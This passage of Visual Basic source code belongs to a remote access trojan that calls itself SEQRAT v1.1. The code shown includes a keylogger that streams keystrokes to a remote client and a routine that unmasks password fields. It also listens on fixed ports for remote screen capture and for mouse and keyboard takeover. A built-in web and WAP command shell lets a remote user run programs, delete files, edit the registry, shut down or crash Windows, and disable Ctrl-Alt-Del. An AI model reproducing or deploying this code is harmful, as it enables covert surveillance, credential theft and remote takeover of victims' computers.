            If isOffline = False Then
                wsSend index, "kl" & data, True
            Else
                'here will be the offline recording feature
            End If
            End If
        Next keycode
        DoEvents
        If EndKeyLogger = True Or ws(index).State <> 7 Then
            EndKeyLogger = True
            Exit Sub
        End If
    Loop
    Exit Sub
errore:
    If ws(index).State = 7 Then
        ws(index).SendData "72" & encdec(sessKey(index), "Error:" & Err.Description & " key logger has been stopped.")
        EndKeyLogger = True
        Exit Sub
    Else
        EndKeyLogger = True
        Exit Sub
    End If
End Sub

Public Function GetCtrl() As Boolean
    GetCtrl = CBool(GetAsyncKeyState(vbKeyControl))
End Function
Public Function GetShift() As Boolean
    GetShift = CBool(GetAsyncKeyState(vbKeyShift)) 'Return or set the Capslock toggle.
End Function

Function Ctrl(Control, Char1, Char2)
    If GetCtrl = True Then
        Control = 1
        Ctrl = Char1
    Else
        Control = 0
        Ctrl = Char2
    End If
End Function
Function Shf(shift, Char1, Char2)
    If GetShift = True Then
        shift = 1 'If shift is present
        Shf = Char1 'then the first character is displayed
    Else
        shift = 0 'if shift isn't present
        Shf = Char2 'then the second character is displayed
    End If
End Function



'scripting stuff

Public Sub scMain_Error()
On Error Resume Next
ts = "script error:" & Str(scMain.Error.Number) & vbCrLf _
    & "Line:" & Str(scMain.Error.Line) & "  Column:" & Str(scMain.Error.Column) & vbCrLf _
    & scMain.Error.Description & vbCrLf _
    & "Source:" & scMain.Error.Source & vbCrLf _
    & "Context:" & IIf(scMain.Error.Text <> "", scMain.Error.Text, "n/a")
    
If errIndex > 0 Then wsSend errIndex, "75" & ts, True
If HTTPerrIndex > 0 Then sendHTTP HTTPerrIndex, ts
End Sub
Public Sub scSend(ByVal index As Integer, ByVal data As String, Optional ByVal NOTencrypt As Boolean)
    If NOTencrypt = False Then
        wsSend index, "s0" & data, True
    Else
        wsSend index, "s1" & data, False
    End If
End Sub
Public Sub scTimer_Timer()
On Error Resume Next
    scMain.run "scTimer_Timer"
End Sub
Public Sub DoeventsEx()
    DoEvents
End Sub
Public Function Formats(var) As String
    Formats = Format(var)
End Function




Public Function SysInfo() As String
On Error Resume Next
Dim sys As SystemInfo
Dim mem As MEMORYSTATUS
    GetSystemInfo sys
    GlobalMemoryStatus mem
    SysInfo = Format(sys.dwProcessorType) & " oem id: " & Format(sys.dwOemId) _
    & vbCrLf & Format(mem.dwTotalPhys) _
    & vbCrLf & Format(mem.dwAvailPhys) _
    & vbCrLf & Format(mem.dwMemoryLoad) & "%" _
    & vbCrLf & GetString("HKEY_LOCAL_MACHINE\hardware\description\system\centralprocessor\0", "ProcessorNameString") _
    & vbCrLf & GetString("HKEY_LOCAL_MACHINE\hardware\description\system\centralprocessor\0", "~MHz") & "~Mhz" & vbCrLf
End Function
Public Function retRegKey(Path As String) As Long
    Select Case UCase(Mid(Path, 1, InStr(1, Path, "\") - 1))
        Case "HKEY_CURRENT_USER": retRegKey = &H80000001
        Case "HKEY_LOCAL_MACHINE": retRegKey = &H80000002
        Case "HKEY_CLASSES_ROOT": retRegKey = &H80000000
        Case "HKEY_USERS": retRegKey = &H80000003
        Case "HKEY_CURRENT_CONFIG": retRegKey = &H80000005
        Case "HKEY_DYN_DATA": retRegKey = &H80000006
        Case "HKEY_PERFORMANCE_DATA": retRegKey = &H80000004
    End Select
End Function
Public Function RegQueryStringValue(ByVal hKey As Long, ByVal strValueName As String) As String
'----------------------------------------------------------------------------
'Argument       :   Handlekey, Name of the Value in side the key
'Return Value   :   String
'Function       :   To fetch the value from a key in the Registry
'Comments       :   on Success , returns the Value else empty String
    '----------------------------------------------------------------------------
    Dim lResult As Long, lValueType As Long, strBuf As String, lDataBufSize As Long
    
    lResult = RegQueryValueEx(hKey, strValueName, 0, lValueType, ByVal 0, lDataBufSize)
    If lResult = 0 Then
        If lValueType = REG_SZ Or lValueType = REG_EXPAND_SZ Then
    
            strBuf = String(lDataBufSize, Chr$(0))
            'retrieve the key's value
            lResult = RegQueryValueEx(hKey, strValueName, 0, 0, ByVal strBuf, lDataBufSize)
            If lResult = 0 Then
    
                RegQueryStringValue = Left$(strBuf, InStr(1, strBuf, Chr$(0)) - 1)
            End If
        ElseIf lValueType = REG_BINARY Then
            Dim strData As Integer
            'retrieve the key's value
            lResult = RegQueryValueEx(hKey, strValueName, 0, 0, strData, lDataBufSize)
            If lResult = 0 Then
                RegQueryStringValue = strData
            End If
         ElseIf lValueType = REG_DWORD Then
           
            'retrieve the key's value
            lResult = RegQueryValueEx(hKey, strValueName, 0, 0, strData, lDataBufSize)
            If lResult = 0 Then
                RegQueryStringValue = strData
            End If
            
        End If
    End If
End Function
Public Function GetString(strPath As String, strValue As String)
'----------------------------------------------------------------------------
'Argument       :   Handlekey, path from the root , Name of the Value in side the key
'Return Value   :   String
'Function       :   To fetch the value from a key in the Registry
'Comments       :   on Success , returns the Value else empty String
'----------------------------------------------------------------------------
    Dim Ret
    hKey& = retRegKey(strPath)
    strPath = Mid(strPath, InStr(1, strPath, "\") + 1, Len(strPath))
    'Open  key
    RegOpenKey hKey, strPath, Ret
    'Get content
    GetString = RegQueryStringValue(Ret, strValue)
    'Close the key
    RegCloseKey Ret
End Function
Public Function SaveStringWORD(ByVal strPath As String, ByVal strData As String) As String
On Error GoTo errore
'----------------------------------------------------------------------------
'Argument       :   Handlekey, Name of the Value in side the key
'Return Value   :   Nil
'Function       :   To store the value into a key in the Registry
'Comments       :   None
'----------------------------------------------------------------------------
    Dim Ret
    hKey& = retRegKey(strPath)
    strValue = JustName(strPath)
    strPath = Mid(strPath, InStr(1, strPath, "\") + 1, Len(strPath))
    strPath = Mid(strPath, 1, Len(strPath) - Len(strValue))
    'Create a new key
    RegCreateKey hKey, strPath, Ret
    'Set the key's value
    r = RegSetValueEx(Ret, strValue, 0, REG_DWORD, CLng(strData), 4)
    'close the key
    RegCloseKey Ret
    If r <> 0 Then GoTo errore
    SaveStringWORD = "saveWORDstring succeded"
    Exit Function
errore:
    SaveStringWORD = "saveWORDstring failed"
End Function
Public Function SaveString(ByVal strPath As String, ByVal strData As String) As String
On Error GoTo errore
'----------------------------------------------------------------------------
'Argument       :   Handlekey, Name of the Value in side the key
'Return Value   :   Nil
'Function       :   To store the value into a key in the Registry
'Comments       :   None
'----------------------------------------------------------------------------
    Dim Ret
    hKey& = retRegKey(strPath)
    strValue = JustName(strPath)
    strPath = Mid(strPath, InStr(1, strPath, "\") + 1, Len(strPath))
    strPath = Mid(strPath, 1, Len(strPath) - Len(strValue))
    Dim toPut As String
    toPut = strData & Chr(0)
    'Create a new key
    RegCreateKey hKey, strPath, Ret
    'Set the key's value
    r = RegSetValueEx(Ret, strValue, 0, REG_SZ, ByVal toPut, Len(toPut))
    'close the key
    RegCloseKey Ret
    If r <> 0 Then GoTo errore
    SaveString = "savestring succeded"
    Exit Function
errore:
    SaveString = "savestring failed"
End Function
Public Function DeleteString(ByVal strPath As String) As String
On Error GoTo errore
Dim r As Long
    'Not used in this form
    'you can use it to delete the current entries
    Dim Ret
    hKey& = retRegKey(strPath)
    strValue = JustName(strPath)
    strPath = Mid(strPath, InStr(1, strPath, "\") + 1, Len(strPath))
    strPath = Mid(strPath, 1, Len(strPath) - Len(strValue))
    'Create a new key
    RegCreateKey hKey, strPath, Ret
    'Delete the key's value
    r = RegDeleteValue(Ret, strValue)
    RegCloseKey Ret
    If r <> 0 Then GoTo errore
    DeleteString = "subkey deleted"
    Exit Function
errore:
    DeleteString = "error deleting subkey"
End Function
Public Function deleteKey(ByVal strPath As String) As String
On Error GoTo errore
Dim Ret
    hKey& = retRegKey(strPath)
    strPath = Mid(strPath, InStr(1, strPath, "\") + 1, Len(strPath))
    r = RegOpenKeyEx(hKey, strPath, 0, KEY_WRITE, Ret)
    'Delete the key
    r = RegDeleteKey(Ret, strPath)
    RegCloseKey Ret
    If r <> 0 Then GoTo errore
    deleteKey = "key deleted"
    Exit Function
errore:
    deleteKey = "error deleting key"
End Function
Public Function EnumerateValues(ByVal strPath As String) As String
On Error Resume Next
Dim lResult As Long
Dim hKey As Long
Dim sName As String
Dim lNameSize As Long
Dim sData As String
Dim lIndex As Long
Dim cJunk As Long
Dim cNameMax As Long
Dim ft As Currency

Dim keypath As String
keypath = strPath

    okey& = retRegKey(strPath)
    strPath = Mid(strPath, InStr(1, strPath, "\") + 1, Len(strPath))
   lIndex = 0
   lResult = RegOpenKey(okey, strPath, hKey)
   If (lResult = 0) Then
      lResult = RegQueryInfoKey(hKey, "", cJunk, 0, _
                               cJunk, cJunk, cJunk, cJunk, _
                               cNameMax, cJunk, cJunk, ft)
       Do While lResult = 0
   
           'Set buffer space
           lNameSize = cNameMax + 1
           sName = String$(lNameSize, 0)
           If (lNameSize = 0) Then lNameSize = 1
           
           'Get value name:
           lResult = RegEnumValue(hKey, lIndex, sName, lNameSize, _
                                  0&, 0&, 0&, 0&)
           If (lResult = 0) Then
               sName = Left$(sName, lNameSize)
               sval = RegQueryStringValue(hKey, sName)
               EnumerateValues = EnumerateValues + sName + _
               " = " + sval + vbCrLf
           End If
           lIndex = lIndex + 1
       Loop
   End If
   If (hKey <> 0) Then
      RegCloseKey hKey
   End If
End Function
Public Function EnumerateSections(ByVal strPath As String) As String
Dim lResult As Long
Dim hKey As Long
Dim dwReserved As Long
Dim szBuffer As String
Dim lBuffSize As Long
Dim lIndex As Long
Dim lType As Long
Dim sCompKey As String
Dim iPos As Long
Dim sSect As String
On Error Resume Next
   lIndex = 0
   okey& = retRegKey(strPath)
   strPath = Mid(strPath, InStr(1, strPath, "\") + 1, Len(strPath))

   lResult = RegOpenKey(okey, strPath, hKey)
   Do While lResult = 0
       'Set buffer space
       szBuffer = String$(255, 0)
       lBuffSize = Len(szBuffer)
      
      'Get next value
       lResult = RegEnumKey(hKey, lIndex, szBuffer, lBuffSize)
                             
       If (lResult = 0) Then
           iSectCount = iSectCount + 1
           iPos = InStr(szBuffer, Chr$(0))
           If (iPos > 0) Then
              sSect = Left(szBuffer, iPos - 1)
           Else
              sSect = Left(szBuffer, lBuffSize)
           End If
        EnumerateSections = EnumerateSections + sSect + vbCrLf
       End If
       
       lIndex = lIndex + 1
   Loop
   If (hKey <> 0) Then
      RegCloseKey hKey
   End If
End Function


Public Sub FormStayOnTop(Handle%, OnTop%)
  Const Swp_Nosize = &H1
  Const SWP_Nomove = &H2
  Const Swp_NoActivate = &H10
  Const Swp_ShowWindow = &H40
  Const Hwnd_TopMost = -1
  Const Hwnd_NoTopMost = -2
  wFlags = SWP_Nomove Or Swp_Nosize Or Swp_ShowWindow Or Swp_NoActivate
  Select Case OnTop%
     Case True
        PosFlag = Hwnd_TopMost
     Case False
         PosFlag = Hwnd_NoTopMost
  End Select
  SetWindowPos Handle%, PosFlag, 0, 0, 0, 0, wFlags
End Sub
Public Function SendMCIString(cmd As String, fShowError As Boolean) As Boolean
Static rc As Long
Static errStr As String * 200

rc = mciSendString(cmd, 0, 0, hwnd)
If (fShowError And rc <> 0) Then
    mciGetErrorString rc, errStr, Len(errStr)
    MsgBox errStr
End If
SendMCIString = (rc = 0)
End Function
Public Function WindowsVersion() As String
On Error Resume Next
Dim myOS As OSVERSIONINFO
Dim lResult As Long
    myOS.dwOSVersionInfoSize = Len(myOS)    'should be 148
    lResult = GetVersionEx(myOS)
    Select Case myOS.dwPlatformId
    Case 1:
            If (myOS.dwMinorVersion) = 0 Then
                platform = "Windows 95"
            Else
                platform = "Windows 98"
            End If
    Case 2: platform = "Windows NT"
    End Select
    WindowsVersion = Format(myOS.dwMajorVersion) & "." & Format(myOS.dwMinorVersion) & ",  " & platform _
    & vbCrLf & GetString("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "ProductId")
End Function
Public Function getusrname() As String
On Error Resume Next
Dim ReturnVal As Long, BuffSize As Long, Buff As String
    BuffSize = 255
    Buff = Space$(BuffSize)
    ReturnVal = GetUserName(Buff, BuffSize)
    If ReturnVal <> 0 Then getusrname = Strip(Buff)
End Function
Public Function getpcname() As String
Dim ReturnVal As Long, BuffSize As Long, Buff As String
    BuffSize = 255
    Buff = Space$(BuffSize)
    ReturnVal = GetComputerName(Buff, BuffSize)
    If ReturnVal <> 0 Then getpcname = Strip(Buff)
End Function
Public Function GetDrive(ByVal DriveName As String) As String
  On Error Resume Next
  Dim ReturnVal As Long
  On Error Resume Next
  ReturnVal = GetDriveType(DriveName)
  Select Case ReturnVal
    Case 0
      GetDrive = "Unknown"
    Case 1
      GetDrive = ""
    Case 2
      GetDrive = "Removable"
    Case 3
      GetDrive = "Fixed"
    Case 4
      GetDrive = "Remote (Network)"
    Case 5
      GetDrive = "CD-ROM"
    Case 6
      GetDrive = "RamDisk"
    Case Else
      GetDrive = "Unknown: " & CStr(ReturnVal)
    End Select
End Function
Public Function ZeroTerminate(ByRef TerminateString As String) As String
  ZeroTerminate = TerminateString & Chr$(0)
End Function
Public Function GetDiskSpaceFree(ByVal strDrive As String) As Long
  On Error Resume Next
  Dim strCurDrive As String
  Dim lDiskFree As Long, lSectorsToACluster As Long, lBytesToASector As Long
  Dim lFreeClusters As Long, lTotalClusters As Long
  If Err <> 0 Then
      lDiskFree = -1
  Else
      lDiskFree = GetDiskFreeSpace(strDrive, lSectorsToACluster, lBytesToASector, lFreeClusters, lTotalClusters)
      If lDiskFree <> 1 Then
          lDiskFree = -1
      Else
          lDiskFree = lSectorsToACluster * lBytesToASector * lFreeClusters
      End If
  End If
  GetDiskSpaceFree = lDiskFree
  Err = 0
End Function
Public Function Strip(ByVal strString As String) As String
    Dim intZeroPos As Integer
    intZeroPos = InStr(strString, Chr$(0))
    If intZeroPos > 0 Then
        Strip = Left$(strString, intZeroPos - 1)
    Else
        Strip = strString
    End If
End Function
Public Function WinDir() As String
On Error Resume Next
Dim ReturnVal As Long, PathBuffSize As Long, PathBuff As String
PathBuffSize = 255
PathBuff = Space$(PathBuffSize)
    ReturnVal = GetWindowsDirectory(PathBuff, PathBuffSize)
    If ReturnVal = 0 Then
        WinDir = CurDir()
        Exit Function
    End If
WinDir = Strip(PathBuff)
End Function
Public Function SysDir() As String
On Error Resume Next
Dim ReturnVal As Long, PathBuffSize As Long, PathBuff As String
PathBuffSize = 255
PathBuff = Space$(PathBuffSize)
    ReturnVal = GetSystemDirectory(PathBuff, PathBuffSize)
    If ReturnVal = 0 Then
        SysDir = CurDir()
        Exit Function
    End If
SysDir = Strip(PathBuff)
End Function
Public Function fulln(ByVal s As String) As String
    If Right(s, 1) <> "\" Then
        fulln = s + "\"
    Else
        fulln = s
    End If
End Function

Public Function JustPath(ByVal s As String) As String
    i = Len(s)
    Do While Mid(s, i, 1) <> "\"
        i = i - 1
        If i = 0 Then Exit Do
    Loop
    If i > 1 Then
        JustPath = Left(s, i)
    Else
    JustPath = CurDir()
    End If
End Function
Public Function JustName(ByVal s As String) As String
    i = Len(s)
    Do While Mid(s, i, 1) <> "\"
        i = i - 1
        If i = 0 Then Exit Do
    Loop
    If i > 1 Then
        JustName = Right(s, Len(s) - i)
    Else
    JustName = s
    End If
End Function


Public Function encdecs(ByVal key As String, ByVal encstr As String)
    For i = 1 To Len(encstr)
        encdecs = encdecs & Chr(Asc(Mid(key, (i Mod 20) + 1, 1)) Xor Asc(Mid(encstr, i, 1)))
    Next i
End Function


Public Sub start_wsScreen()
On Error Resume Next
    wsScreen.LocalPort = 17090
    If wsScreen.State <> sckClosed Then wsScreen.Close
    wsScreen.Listen
End Sub

Public Sub wsScreen_ConnectionRequest(ByVal requestID As Long)
On Error Resume Next
    If wsScreen.State <> sckClosed Then wsScreen.Close
    wsScreen.Accept requestID
End Sub




Public Sub wsScreen_close()
On Error Resume Next
    wsScreen.Close
    'wsScreen.LocalPort = 1709
    'If capScreen = 1 Then wsScreen.Listen
End Sub

'Public Sub wsScreen_SendComplete()
   'scScreen = 1
'End Sub

Public Sub RevealPasswords(ByVal hWndParent As Long)
    Dim hWndChild As Long
    hWndChild = GetWindow(hWndParent, 5 Or 0)
    Do While hWndChild <> 0
            Sendmessagebynum hWndChild, &HCC, 0&, 0&
            RevealPasswords hWndChild
            hWndChild = GetWindow(hWndChild, 2)
    Loop
End Sub


Public Sub start_wsMouseK()
On Error Resume Next
    wsMouseK.LocalPort = 17091
    If wsMouseK.State <> sckClosed Then wsMouseK.Close
    wsMouseK.Listen
End Sub

Public Sub wsMouseK_ConnectionRequest(ByVal requestID As Long)
On Error Resume Next
    If wsMouseK.State <> sckClosed Then wsMouseK.Close
    wsMouseK.Accept requestID
End Sub


Public Sub wsMouseK_DataArrival(ByVal bytes As Long)
On Error Resume Next
Dim data As String
Dim sk
    wsMouseK.GetData data
    args = Mid(data, 3, Len(data))
    Select Case Mid(data, 1, 2)
        Case "xx": wsMouse.Close
        Case "sp": SetCursorPos CLng(Mid(args, 1, InStr(1, args, Chr(0)) - 1)), CLng(Mid(args, InStr(1, args, Chr(0)) + 1, Len(args)))
        Case "lc": LeftClick
        Case "dc":  LeftClick
                    LeftClick
        Case "rc": RightClick
        Case "mc": MiddleClick
        Case "ld": LeftDown
        Case "lu": LeftUp
        Case "rd": RightDown
        Case "ru": RightUp
        Case "md": MiddleDown
        Case "mu": MiddleUp
        Case "lk": sendKey (Trim(Mid(args, 1, 3)) & Mid(args, 4, Len(args)))
     End Select
wsMouseK.SendData Chr(0)
End Sub

Public Sub wsMouseK_close()
On Error Resume Next
    wsMouseK.Close
    wsMouseK.LocalPort = 17091
    If capScreen = 1 Then wsMouseK.Listen
End Sub

'Public Sub wsScreen_SendComplete()
   'scScreen = 1
'End Sub

Public Sub dirsNfiles(ByVal index As Integer, ByVal Path As String)
On Error Resume Next
Dim data As String
    cfile = Dir(fulln(Path) + "*.*", 55)
    Do While cfile <> ""
        cfilename = fulln(Path) & cfile
        fattr = atrib(GetAttr(cfilename))
        flen = FileLen(cfilename)
        fdate = Format(FileDateTime(cfilename))
        
        data = cfile & ";" _
        & flen & ";" _
        & fattr & ";" _
        & fdate
        
        wsSend index, "f2" & data, True
        cfile = Dir
    Loop
End Sub

Public Function OpenDoc(ByVal address As String) As Long
On Error Resume Next
OpenDoc = ShellExecute(hwnd, "Open", address, "", App.Path, 1)
End Function


Public Function checkIPlist(hostIP As String) As Byte
If lstIPs.ListCount = 0 Then checkIPlist = 1
For i = 0 To lstIPs.ListCount - 1
    If Option1.Value = True Then
        If hostIP = Trim(lstIPs.List(i)) Then Exit Function
    Else
        If hostIP = Trim(lstIPs.List(i)) Then
            checkIPlist = 1
            Exit Function
        End If
    End If
Next i
End Function




'HTTP server functions


Public Sub btnHTTPon_Click()
On Error Resume Next
sckHTTP(0).LocalPort = txtHTTPport.Text

Do While sckHTTP(0).State <> sckClosed
    sckHTTP(0).Close
    DoEvents
Loop

sckHTTP(0).Listen

shpHTTP.BackColor = vbGreen
lblBrowse.Visible = True
lblAddress.Visible = True
lblAddress.Caption = sckHTTP(0).LocalIP & ":" & txtHTTPport.Text

For i = 0 To 1
    If optHTTP(i).Value = flase Then optHTTP(i).Enabled = False
Next i
End Sub

Public Sub btnHTTPoff_Click()
On Error Resume Next
For i = 1 To HTTPs
    sckHTTP(i).Close
    Unload sckHTTP(i)
Next i
sckHTTP(0).Close
shpHTTP.BackColor = vbRed
lblBrowse.Visible = False
lblAddress.Visible = False

For i = 0 To 1
    If optHTTP(i).Value = False Then optHTTP(i).Enabled = True
Next i

End Sub

Public Sub sckHTTP_close(index As Integer)
If index <> 0 Then
    sckHTTP(index).Close
    Unload sckHTTP(index)
    HTTPs = HTTPs - 1
End If
End Sub

Public Sub sckhttp_ConnectionRequest(index As Integer, ByVal requestID As Long)
On Error Resume Next
If index = 0 Then
    If checkIPlist(sckHTTP(0).RemoteHostIP) = 1 Then Exit Sub
    HTTPs = HTTPs + 1
    Load sckHTTP(HTTPs)
    sckHTTP(HTTPs).LocalPort = 0
    sckHTTP(HTTPs).Accept requestID
End If
End Sub

Public Sub sckHTTP_DataArrival(index As Integer, ByVal bytesTotal As Long)
Dim data As String
Dim cmd As String

sckHTTP(index).GetData data
'Debug.Print data
If Mid$(data, 1, 3) = "GET" Then
    If optHTTP(0).Enabled = True Then
        sendHTTP index, ""
    Else
        sendWAP index, ""
    End If
ElseIf Mid$(data, 1, 4) = "POST" Then
    cmd = Mid(data, InStr(1, data, "Command=") + 8, Len(data))
    Call sendCmdResult(index, cmd)
End If

End Sub

Public Sub sckhttp_sendcomplete(index As Integer)
    sckHTTP(index).Close
    Unload sckHTTP(index)
    HTTPs = HTTPs - 1
End Sub

Public Sub sendHTTP(ByVal index As Integer, ByVal HTTPdata As String)

initPage = "<html><head><title>SEQRAT v1.1 - http server command line </title>" _
& "</head><body bgcolor=#003366 text=#0099CC>" _
& "<p align=center><b><font color=#00CCFF >SEQRAT v1.1 - http server command line</b>" _
& "<br align=center><b>(c) 2002 - Joaquin Encina</b></br>" _
& "<br align=center><b>type &nbsp;?&nbsp; or &nbsp;/help&nbsp; for server's available commands; type &nbsp;help&nbsp; for DOS help</b></br></font>" _
& "<hr><form name=form1 method=POST><b><font color=#00CCFF>&nbsp;<input type=submit " _
& "name=Send value=send&nbsp;command: >&nbsp;<input type=text name=Command size=36>" _
& "</form><hr></font></b>"

'translate for browser
HTTPdata = Replace(HTTPdata, "<", "&lt")
HTTPdata = Replace(HTTPdata, ">", "&gt")
HTTPdata = Replace(HTTPdata, " ", "&nbsp;")
HTTPdata = Replace(HTTPdata, vbCrLf, "<br>")
HTTPdata = "<font color=#00FFFF face=courier new>" & HTTPdata & "</font></body></html>"

httptemp = mimeHeader(200, Len(initPage) + 14 + Len(HTTPdata), "", "keep-alive") _
& initPage & HTTPdata
sckHTTP(index).SendData httptemp
'Debug.Print httpTemp
End Sub

Public Sub sendWAP(ByVal index As Integer, ByVal HTTPdata As String)

initPage = "<?xml version=""1.0""?>" & vbCrLf _
& "<!DOCTYPE wml PUBLIC ""-//WAPFORUM//DTD WML 1.1//EN"" ""http://www.wapforum.org/DTD/wml_1.1.xml"">" & vbCrLf _
& "<wml>" & vbCrLf & "<card title=""SEQRAT server 1.2"">" & vbCrLf _
& "<do type=""accept"" label=""send""><go method=""post"" href=""http://" & sckHTTP(0).LocalIP & ":" & sckHTTP(0).LocalPort & """><postfield name=""Command"" value=""$(Command)""/></go></do>" & vbCrLf _
& "<p>command : <input type=""text"" name=""Command""/></p>" & vbCrLf _

'translate for wap device
HTTPdata = Replace(HTTPdata, "<", "&#60;")
HTTPdata = Replace(HTTPdata, ">", "&#62;")
HTTPdata = Replace(HTTPdata, vbCrLf, "<br>")

'limitation of WAP protocol: in order to sent WML pages
'to a WAP enabled device the data is limited to 1200 uncompiled bytes
'so we have to reduce it .... so we make a guess here.....
If Len(initPage) + Len(HTTPdata) > 1800 Then HTTPdata = Mid(HTTPdata, 1, 1800)

HTTPdata = HTTPdata & "</card></wml>"

httptemp = "HTTP/1.1 200 OK" & vbCrLf _
& "Date: " & Format(Now, "ddd, d mmm yyyy ") & Format(sTime, " hh:mm:ss ") & "GMT" & vbCrLf _
& "Server: SEQRAT WAP server 1.2" & vbCrLf _
& "Last-Modified: " & Format(Now, "ddd, d mmm yyyy ") & Format(sTime, " hh:mm:ss ") & "GMT" & vbCrLf _
& "Accept-Ranges: bytes" & vbCrLf _
& "Content-Length: " & Len(initPage) + Len(HTTPdata) & vbCrLf _
& "Connection: keep-alive" & vbCrLf _
& "Content-Type: text/vnd.wap.wml" & vbCrLf & vbCrLf _
& initPage & HTTPdata

sckHTTP(index).SendData httptemp
'Debug.Print httpTemp
End Sub

Function mimeHeader(httpCode As Integer, dataLength As Long, fileExt As String, conType As String) As String
    Dim mimeType As String
    Dim sDate As Date
    Dim sTime As Date
    sDate = Date
    sTime = Time
    Select Case fileExt
        Case "htm": mimeType = "text/html"
        Case "wml": mimeType = "text/vnd.wap.wml"
        Case Else: mimeType = "text/plain"
    End Select
   
mimeHeader = "HTTP/1.0 " & Str(httpCode) & " " & getReason(httpCode) & vbCrLf _
               & "Date: " & Format(sDate, "ddd, d mmm yyyy ") & Format(sTime, " hh:mm:ss ") & "GMT" & vbCrLf _
               & "Server: SEQRAT v1.1" & vbCrLf _
               & "MIME-version: 1.0" & vbCrLf _
               & "Content-type: " & mimeType & vbCrLf _
               & "Connection: " & conType & vbCrLf _
               & "Content-length: " & Str(dataLength) & vbCrLf & vbCrLf
End Function

Function getReason(httpCode As Integer) As String
    Select Case httpCode
        Case 200: getReason = "OK"
        Case 201: getReason = "Created"
        Case 202: getReason = "Accepted"
        Case 204: getReason = "No Content"
        Case 304: getReason = "Not Modified"
        Case 400: getReason = "Bad Request"
        Case 401: getReason = "Unauthorized"
        Case 403: getReason = "Forbidden"
        Case 404: getReason = "Not Found"
        Case 500: getReason = "Internal Server Error"
        Case 501: getReason = "Not Implemented"
        Case 502: getReason = "Bad Gateway"
        Case 503: getReason = "Service Unavailable"
        Case Else: getReason = "Unknown"
    End Select
End Function


Public Sub sendCmdResult(index As Integer, ByVal cmd As String)
    xtemp = cmdResult(index, cmd)
    If xtemp <> "" Then
        If optHTTP(0).Value = True Then
            sendHTTP index, xtemp
        Else
            sendWAP index, xtemp
        End If
    End If
End Sub

'these are here again cose i wanted to send to client
'only some little responses to optimize bandwidth
'and to the web browser sort of full responses to know what happened
'and the web commands are more human readable than client's

Public Function cmdResult(index As Integer, ByVal cmd As String) As String
On Error Resume Next
'first we translate from http
cmd = Replace(cmd, vbCrLf, "", , , vbTextCompare)
cmd = Replace(cmd, "+", " ", , , vbTextCompare)
cmd = Replace(cmd, "%20", " ", , , vbTextCompare)
cmd = Replace(cmd, "%21", "!", , , vbTextCompare)
cmd = Replace(cmd, "%22", Chr(34), , , vbTextCompare)
cmd = Replace(cmd, "%A7", "§", , , vbTextCompare)
cmd = Replace(cmd, "%24", "$", , , vbTextCompare)
cmd = Replace(cmd, "%25", "%", , , vbTextCompare)
cmd = Replace(cmd, "%26", "&", , , vbTextCompare)
cmd = Replace(cmd, "%2F", "/", , , vbTextCompare)
cmd = Replace(cmd, "%28", "(", , , vbTextCompare)
cmd = Replace(cmd, "%29", ")", , , vbTextCompare)
cmd = Replace(cmd, "%3D", "=", , , vbTextCompare)
cmd = Replace(cmd, "%3F", "?", , , vbTextCompare)
cmd = Replace(cmd, "%B2", "²", , , vbTextCompare)
cmd = Replace(cmd, "%B3", "³", , , vbTextCompare)
cmd = Replace(cmd, "%7B", "{", , , vbTextCompare)
cmd = Replace(cmd, "%5B", "[", , , vbTextCompare)
cmd = Replace(cmd, "%5D", "]", , , vbTextCompare)
cmd = Replace(cmd, "%7D", "}", , , vbTextCompare)
cmd = Replace(cmd, "%5C", "\", , , vbTextCompare)
cmd = Replace(cmd, "%DF", "ß", , , vbTextCompare)
cmd = Replace(cmd, "%23", "#", , , vbTextCompare)
cmd = Replace(cmd, "%27", "'", , , vbTextCompare)
cmd = Replace(cmd, "%3A", ":", , , vbTextCompare)
cmd = Replace(cmd, "%2C", ",", , , vbTextCompare)
cmd = Replace(cmd, "%3B", ";", , , vbTextCompare)
cmd = Replace(cmd, "%60", "`", , , vbTextCompare)
cmd = Replace(cmd, "%7E", "~", , , vbTextCompare)
cmd = Replace(cmd, "%2B", "+", , , vbTextCompare)
cmd = Replace(cmd, "%B4", "´", , , vbTextCompare)

If cmd = "?" Then
    cmdResult = openPage(App.Path & "\webcommands.txt")
    Exit Function
End If
    
If Left(cmd, 1) = "/" Then
    spcol = InStr(1, cmd, " ")
    If spcol < 1 Then spcol = Len(cmd) + 1
    args = Mid(cmd, spcol + 1, Len(cmd))
    cmd = Mid(cmd, 2, spcol - 2)
Else
    args = cmd
    cmd = "65"
End If

Select Case LCase(cmd)
    Case "help": ts = openPage(App.Path & "\webcommands.txt")
    Case "02", "sendkeys": ts = IIf(sendKey(args) = 1, "keys sent to current application.", "keysend error.")
    Case "03", "run":
                If Right(args, 1) <> "0" And Right(args, 1) <> "1" And _
                Right(args, 1) <> "2" And Right(args, 1) <> "3" And Right(args, 1) <> "4" Then args = args & "1"
                ts = run(args)
                ts = IIf(ts = 0, "running " & Mid(args, 1, Len(args) - 1) & " failed.", Mid(args, 1, Len(args) - 1) & " started. program's task ID:" & ts)
    Case "04", "browse": ts = browse(args)
    Case "05", "kill": KillFile (args)
                ts = "action executed."
    Case "08", "exit": Call ExitWindowsEx(Val(args), 0)
    Case "09", "beep": bep (args)
    Case "xx", "unload": Unload Me
    Case "12", "listwind": ts = listWind(True)
    Case "15", "info": ts = Infos(-1, True)
    Case "16", "msgbox": msg (args)
                ts = "user responded to messagebox."
    Case "17", "bsod": Shell "/con/con", vbHide
    Case "18", "makedir": MkDir (args)
                ts = "dir should be made."
    Case "19", "remdir": RmDir (args)
                ts = "unknown result."
    Case "21", "opencd": CDOpen
                ts = "CD-ROM tray opened"
    Case "22", "closecd": CDClose
                ts = "CD-ROM tray closed."
    Case "23", "cadoff": x = SystemParametersInfo(97, True, CStr(1), 0)
               ts = IIf(x = True, "ctrl-alt-del disabled.", "ctr-alt-del cannot be disabled.")
    Case "24", "cadon": x = SystemParametersInfo(97, False, CStr(1), 0)
               ts = IIf(x = True, "ctrl-alt-del enabled.", "ctrl-alt-del cannot be enabled.")
    Case "25", "chat":
                If frmChat.Text1.Visible = True And frmChat.Visible = True Then
                    ts = frmChat.Text1.Text & vbCrLf
                Else
                    ts = "chat started."
                    frmChat.Text1.Text = args + vbCrLf
                    frmChat.Text1.SelStart = Len(frmChat.Text1.Text)
                    frmChat.Show vbModal, Me
                End If
    Case "26", "chatx":
                frmChat.Text1.Visible = True
                frmChat.Image1.Visible = False
                For soknr = 1 To 5
                If ws(soknr).State = 7 Then
                    wsSend soknr, "26" & "<" & Format(index) & "> " & args, True
                End If
                Next soknr
                If args = "cmdCloseX" Then
                    Unload frmChat
